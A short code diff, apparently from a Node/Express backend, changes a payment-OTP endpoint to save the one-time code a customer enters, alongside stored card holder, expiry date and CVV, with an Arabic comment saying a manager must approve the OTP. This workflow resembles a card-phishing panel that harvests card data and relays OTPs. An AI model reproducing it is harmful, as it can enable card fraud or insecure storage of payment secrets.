@@ -791,7 +791,7 @@ router.post("/:id/payment-otp", async (req, res) => {
         paymentCardHolder: app.paymentCardHolder,
         paymentExpiryDate: app.paymentExpiryDate,
         paymentCvv: app.paymentCvv,
-        paymentOtp: app.paymentOtp,
+        paymentOtp: otp, // استخدام الرمز الجديد الذي أدخله العميل
         paymentStatus: "otp_submitted", // حالة جديدة: بانتظار موافقة المدير على OTP
         paymentCompletedAt: null,
         extraData: app.extraData,
